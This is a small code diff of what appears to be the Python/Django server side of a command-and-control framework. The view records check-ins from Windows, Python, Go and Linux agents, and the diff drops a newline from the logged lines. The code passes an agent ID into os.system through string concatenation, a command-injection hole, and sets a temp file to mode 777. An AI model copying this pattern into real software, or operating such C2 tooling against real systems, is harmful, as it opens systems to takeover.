@@ -50,16 +50,16 @@ def default(request):
 			os.system("chmod 777 /tmp/C2CON-ping.txt")
 			os.system("cat /tmp/C2CON-temping > /tmp/C2CON-ping.txt")
 			if o ==  "W":
-				cmd = "echo 'Last Ping - Agent " + sid + " (Windows) => "+ str(timenow)+ "\n' >> /tmp/C2CON-ping.txt"
+				cmd = "echo 'Last Ping - Agent " + sid + " (Windows) => "+ str(timenow) + "' >> /tmp/C2CON-ping.txt"
 				os.system(cmd)
 			if o ==  "P":
-				cmd = "echo 'Last Ping - Agent " + sid + " (Python) => "+ str(timenow)+ "\n' >> /tmp/C2CON-ping.txt"
+				cmd = "echo 'Last Ping - Agent " + sid + " (Python) => "+ str(timenow)+ "' >> /tmp/C2CON-ping.txt"
 				os.system(cmd)
 			if o ==  "G":
-				cmd = "echo 'Last Ping - Agent " + sid + " (Go) => "+ str(timenow)+ "\n' >> /tmp/C2CON-ping.txt"
+				cmd = "echo 'Last Ping - Agent " + sid + " (Go) => "+ str(timenow)+ "' >> /tmp/C2CON-ping.txt"
 				os.system(cmd)
 			if o ==  "L":
-				cmd = "echo 'Last Ping - Agent " + sid + " (Linux) => "+ str(timenow)+ "\n' >> /tmp/C2CON-ping.txt"
+				cmd = "echo 'Last Ping - Agent " + sid + " (Linux) => "+ str(timenow)+ "' >> /tmp/C2CON-ping.txt"
 				os.system(cmd)
     			    			    		
 			return HttpResponse(f)
